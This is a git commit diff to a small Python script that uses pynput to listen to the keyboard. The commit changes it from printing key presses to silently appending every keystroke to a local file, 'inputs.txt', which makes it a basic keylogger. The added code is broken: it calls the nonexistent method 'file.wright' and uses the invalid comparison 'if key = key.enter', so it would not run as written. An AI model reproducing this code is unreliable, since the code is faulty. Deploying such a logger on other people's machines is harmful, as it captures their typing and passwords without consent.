2dba01f8fe9701edcf8d7a5fbfd6d07591b11ffe
Hemlock Valor <143224038+beano143@users.noreply.github.com>
2023-11-06 15:54:58 -0600

    Update keyboard_input_tracker.py

--- minor_code/keyboard_input_tracker.py
+++ minor_code/keyboard_input_tracker.py
@@ -1,13 +1,17 @@
 from pynput import keyboard
 
 def on_press(key):
-    try:
-        print(f'alphanumeric key {key.char} pressed')
-    except AttributeError:
-        print(f'special key {key} pressed')
-
+    with open ('inputs.txt', 'a') as file:
+        try:
+            file.wright(f'{key.char}')
+        except AttributeError:
+            if key = key.enter:
+                file.write("\n")
+            else:
+                file.write(f'{key}')
+    
 def on_release(key):
-    print(f'{key} released')
+    pass
   
 listener = keyboard.Listener(on_press=on_press, on_release=on_release)
 listener.start()
